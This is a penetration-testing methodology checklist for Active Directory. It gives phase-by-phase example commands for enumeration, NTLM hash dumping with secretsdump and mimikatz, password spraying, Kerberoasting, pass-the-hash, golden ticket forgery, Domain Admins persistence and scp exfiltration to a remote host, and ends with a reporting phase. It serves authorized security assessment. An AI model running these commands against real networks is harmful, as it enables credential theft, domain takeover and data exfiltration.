## Overview
This methodology outlines a structured approach to assessing the security of Active Directory environments. Each phase includes objectives, tasks, and example commands for a streamlined workflow.

---

## Methodology Checklist

### 1. Information Gathering

- [ ] **Objective**: Collect information about the target AD environment.
- [ ] **Network Discovery**:
  - [ ] Identify live hosts, domains, and IP ranges.
  - [ ] Tools: `nmap`, `Netdiscover`.
  - [ ] **Example Command**:
    - [ ] `nmap -sn <target_subnet>/24`
- [ ] **Domain Enumeration**:
  - [ ] Enumerate domain controllers, servers, and workstations.
  - [ ] Tools: `PowerView`, `BloodHound`, `ADRecon`.
  - [ ] **Example Command**:
    - [ ] `Get-NetDomainController -Domain <target_domain>`
  
### 2. **User Enumeration**
- [ ] **Objective**: Identify and enumerate domain users and groups.
- [ ] **Enumerate Users**:
  - [ ] Gather domain user details.
  - [ ] Tools: `rpcclient`, `CrackMapExec`, `BloodHound`.
  - [ ] **Example Command**:
    - [ ] `rpcclient -U "" <target_ip> -c "enumdomusers"`
- [ ] **Identify Privileged Groups**:
  - [ ] Enumerate members of domain admin groups.
  - [ ] Tools: `BloodHound`, `ldapsearch`.
  - [ ] **Example Command**:
    - [ ] `Get-NetGroupMember -GroupName "Domain Admins"`
  
### 3. **Credential Harvesting**
- [ ] **Objective**: Collect credentials from exposed sources.
- [ ] **SMB Shares Enumeration**:
  - [ ] Look for readable/writable shares containing sensitive data.
  - [ ] Tools: `smbclient`, `CrackMapExec`.
  - [ ] **Example Command**:
    - [ ] `smbclient -L //target_ip -U guest`
- [ ] **Password Dumping**:
  - [ ] Extract NTLM hashes from LSASS or registry.
  - [ ] Tools: `mimikatz`, `secretsdump.py`.
  - [ ] **Example Command**:
    - [ ] `secretsdump.py -just-dc-user <username> <target_domain>/<username>:<password>@<target_ip>`

### 4. **Password Attacks**
- [ ] **Objective**: Exploit weak passwords.
- [ ] **Password Spraying**:
  - [ ] Test commonly used passwords across many accounts.
  - [ ] Tools: `crackmapexec`, `Hydra`.
  - [ ] **Example Command**:
    - [ ] `crackmapexec smb <target_subnet> -u users.txt -p "Password123!"`
- [ ] **Kerberoasting**:
  - [ ] Request service tickets for SPN-enabled accounts.
  - [ ] Tools: `GetUserSPNs.py`, `Invoke-Kerberoast`.
  - [ ] **Example Command**:
    - [ ] `python3 GetUserSPNs.py <domain>/<username>:<password> -outputfile hashes.txt`
- [ ] **ASREPRoasting**:
  - [ ] Identify accounts without preauthentication.
  - [ ] Tools: `GetNPUsers.py`, `Impacket`.
  - [ ] **Example Command**:
    - [ ] `python3 GetNPUsers.py <domain>/ -usersfile users.txt -format hashcat`

### 5. **Privilege Escalation**
- [ ] **Objective**: Escalate privileges within the domain.
- [ ] **Local Admin Check**:
  - [ ] Identify users with admin access on specific hosts.
  - [ ] Tools: `BloodHound`, `Invoke-ACLScanner`.
  - [ ] **Example Command**:
    - [ ] `BloodHound -CollectionMethod Group`
- [ ] **Exploiting Permissions**:
  - [ ] Abuse misconfigurations in permissions and privileges.
  - [ ] Tools: `PowerUp`, `BloodHound`.
  - [ ] **Example Command**:
    - [ ] `Invoke-ACLScanner -ResolveGUIDs`
  
### 6. **Lateral Movement**
- [ ] **Objective**: Move between hosts and escalate privileges.
- [ ] **Pass-the-Hash/Pass-the-Ticket**:
  - [ ] Use NTLM hashes or Kerberos tickets to access other hosts.
  - [ ] Tools: `mimikatz`, `pth-winexe`.
  - [ ] **Example Command**:
    - [ ] `mimikatz # sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash> /run:powershell.exe`
- [ ] **Remote Command Execution**:
  - [ ] Execute commands on remote hosts.
  - [ ] Tools: `Invoke-Command`, `wmiexec.py`.
  - [ ] **Example Command**:
    - [ ] `wmiexec.py <domain>/<username>:<password>@<target_ip> "ipconfig"`
  
### 7. **Persistence**
- [ ] **Objective**: Maintain access to the environment.
- [ ] **Add User to Domain Admins**:
  - [ ] Add a new user account to privileged groups.
  - [ ] Tools: `net group`, `Add-DomainGroupMember`.
  - [ ] **Example Command**:
    - [ ] `net group "Domain Admins" /add <username> /domain`
- [ ] **Golden Ticket Attack**:
  - [ ] Forge Kerberos TGT to impersonate a Domain Admin.
  - [ ] Tools: `mimikatz`.
  - [ ] **Example Command**:
    - [ ] `mimikatz # kerberos::golden /user:<username> /domain:<domain> /sid:<domain_SID> /krbtgt:<krbtgt_hash> /ticket:ticket.kirbi`
  
### 8. **Post-Exploitation**
- [ ] **Objective**: Explore additional data and validate access.
- [ ] **Data Collection**:
  - [ ] Extract sensitive information from AD or network shares.
  - [ ] Tools: `dir`, `smbclient`, `PowerView`.
  - [ ] **Example Command**:
    - [ ] `smbclient //target_ip/share -U guest`
- [ ] **Exfiltration**:
  - [ ] Transfer data securely out of the network.
  - [ ] Tools: `scp`, `Invoke-WebRequest`.
  - [ ] **Example Command**:
    - [ ] `scp <file> user@<remote_ip>:/destination`
  
### 9. **Reporting**
- [ ] **Objective**: Document findings and remediation recommendations.
- [ ] **Summary of Findings**:
  - [ ] Provide high-level findings.
- [ ] **Detailed Findings**:
  - [ ] Include evidence, commands used, and screenshots.
- [ ] **Recommendations**:
  - [ ] Provide remediation steps and best practices for hardening.

---

### Appendix: Tools Summary

| Phase                | Tool              | Purpose                                     |
|----------------------|-------------------|---------------------------------------------|
| Information Gathering| `nmap`, `Netdiscover` | Discovering hosts and domain enumeration|
| User Enumeration     | `rpcclient`, `BloodHound` | Enumerating users and groups            |
| Credential Harvesting| `mimikatz`, `secretsdump.py` | Extracting credentials                  |
| Password Attacks     | `Hydra`, `crackmapexec` | Password spraying and brute-forcing     |
| Privilege Escalation | `BloodHound`, `PowerUp` | Identifying misconfigurations          |
| Lateral Movement     | `wmiexec.py`, `mimikatz` | Moving between hosts                    |
| Persistence          | `mimikatz`, `net group` | Setting up persistence                 |
| Post-Exploitation    | `PowerView`, `smbclient` | Extracting and exfiltrating data       |
